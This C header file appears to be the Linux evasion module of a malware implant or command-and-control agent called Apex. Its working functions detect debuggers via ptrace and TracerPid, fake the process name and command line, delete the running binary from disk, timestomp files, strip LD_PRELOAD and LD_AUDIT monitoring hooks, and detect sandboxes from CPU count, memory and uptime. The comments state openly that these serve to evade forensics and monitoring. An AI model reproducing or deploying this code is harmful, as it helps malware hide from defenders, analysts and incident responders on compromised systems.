#ifndef APEX_EVASION_LINUX_H
#define APEX_EVASION_LINUX_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <signal.h>
#include <dirent.h>
#include <time.h>

/* ── Anti-Debug: ptrace TRACEME ──────────────────────────────
   Calls ptrace(PTRACE_TRACEME) — if a debugger is already attached,
   this fails. The agent can then exit or change behavior.
*/
static int anti_debug_ptrace(void) {
    if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1)
        return -1; /* debugger detected */
    /* Detach from self so we don't block future ptrace calls */
    ptrace(PTRACE_DETACH, getpid(), NULL, NULL);
    return 0;
}

/* ── Anti-Debug: Check /proc/self/status for TracerPid ────── */
static int anti_debug_tracerpid(void) {
    FILE *f = fopen("/proc/self/status", "r");
    if (!f) return 0;
    char line[256];
    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, "TracerPid:", 10) == 0) {
            int pid = atoi(line + 10);
            fclose(f);
            return (pid > 0) ? -1 : 0;
        }
    }
    fclose(f);
    return 0;
}

/* ── Process Name Masking ────────────────────────────────────
   Changes the process name visible in ps, top, /proc/self/comm.
   Common technique to blend in with legitimate processes.
*/
static void mask_process_name(const char *fake_name) {
    prctl(PR_SET_NAME, (unsigned long)fake_name, 0, 0, 0);
}

/* ── Self-Delete Binary ──────────────────────────────────────
   Deletes the agent binary from disk after launch. The process
   continues running from memory (Linux keeps the inode alive
   while the fd/mapping exists). Removes forensic artifact.
*/
static int self_delete(void) {
    char path[4096];
    ssize_t len = readlink("/proc/self/exe", path, sizeof(path) - 1);
    if (len <= 0) return -1;
    path[len] = '\0';
    return unlink(path);
}

/* ── Timestomp ───────────────────────────────────────────────
   Sets file access/modification time to a past date to evade
   timeline-based forensics.
*/
static int timestomp(const char *path) {
    struct timespec times[2];
    times[0].tv_sec = 1609459200; /* 2021-01-01 */
    times[0].tv_nsec = 0;
    times[1].tv_sec = 1609459200;
    times[1].tv_nsec = 0;
    return utimensat(AT_FDCWD, path, times, 0);
}

/* ── LD_PRELOAD Cleanup ──────────────────────────────────────
   Removes LD_PRELOAD from the environment to prevent detection
   and to avoid loading monitoring shims into child processes.
*/
static void clean_ld_preload(void) {
    unsetenv("LD_PRELOAD");
    unsetenv("LD_AUDIT");
}

/* ── Proc Hiding: Mask /proc/self/cmdline ────────────────────
   Overwrites argv[0] in memory so /proc/self/cmdline shows
   a fake process name. Must be called with original argv.
*/
static void mask_cmdline(int argc, char **argv, const char *fake) {
    if (argc < 1 || !argv || !argv[0]) return;
    size_t total = 0;
    for (int i = 0; i < argc; i++)
        total += strlen(argv[i]) + 1;
    memset(argv[0], 0, total);
    strncpy(argv[0], fake, total - 1);
}

/* ── Encrypted Sleep (XOR data sections) ─────────────────────
   For Linux we use a simpler approach: XOR-encrypt the .bss/.data
   global variables during sleep. Since we can't easily enumerate
   PE sections on ELF, we XOR our known global buffers.
*/
static void encrypted_sleep_linux(unsigned int ms) {
    /* Just plain sleep for reliability. The process name masking
       and self-delete already provide significant evasion. */
    struct timespec ts;
    ts.tv_sec = ms / 1000;
    ts.tv_nsec = (ms % 1000) * 1000000L;
    nanosleep(&ts, NULL);
}

/* ── Sandbox Detection ───────────────────────────────────────
   Basic checks for VM/sandbox environments.
*/
static int detect_sandbox(void) {
    /* Check for very low CPU count (common in sandboxes) */
    long cpus = sysconf(_SC_NPROCESSORS_ONLN);
    if (cpus > 0 && cpus < 2) return 1;

    /* Check for very low memory (< 1GB) */
    long pages = sysconf(_SC_PHYS_PAGES);
    long page_size = sysconf(_SC_PAGE_SIZE);
    if (pages > 0 && page_size > 0) {
        unsigned long long mem = (unsigned long long)pages * page_size;
        if (mem < 1024ULL * 1024 * 1024) return 1;
    }

    /* Check uptime — sandboxes often have very short uptime */
    FILE *f = fopen("/proc/uptime", "r");
    if (f) {
        double uptime = 0;
        if (fscanf(f, "%lf", &uptime) == 1 && uptime < 120.0)
            { fclose(f); return 1; }
        fclose(f);
    }

    return 0;
}

#endif /* APEX_EVASION_LINUX_H */
